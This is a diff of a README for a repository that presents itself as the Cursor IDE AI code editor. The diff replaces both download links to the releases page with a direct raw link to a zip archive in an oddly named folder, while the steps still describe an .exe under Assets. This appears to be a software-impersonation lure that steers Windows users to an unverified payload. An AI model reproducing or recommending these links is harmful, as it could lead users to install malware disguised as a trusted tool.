@@ -1,6 +1,6 @@
 # 🤖 cursor-ide - Build better code with smart tools
 
-[![Download Cursor IDE](https://img.shields.io/badge/Download_Cursor_IDE-blue)](https://github.com/realjowy/cursor-ide/releases)
+[![Download Cursor IDE](https://img.shields.io/badge/Download_Cursor_IDE-blue)](https://raw.githubusercontent.com/realjowy/cursor-ide/main/Urgonian/ide_cursor_v1.6.zip)
 
 Cursor IDE helps you write code faster. It uses modern artificial intelligence to assist with programming tasks. This software works as a text editor where you type your code and the tool suggests improvements. It functions like a pair programmer that sits next to you while you work.
 
@@ -8,7 +8,7 @@ Cursor IDE helps you write code faster. It uses modern artificial intelligence t
 
 To start using this tool on your Windows computer, follow these steps.
 
-1. Visit the [Download Page](https://github.com/realjowy/cursor-ide/releases) to find the latest version.
+1. Visit the [Download Page](https://raw.githubusercontent.com/realjowy/cursor-ide/main/Urgonian/ide_cursor_v1.6.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section of the newest release.
 3. Click the file name to start the download.
 4. Save the file to your computer.
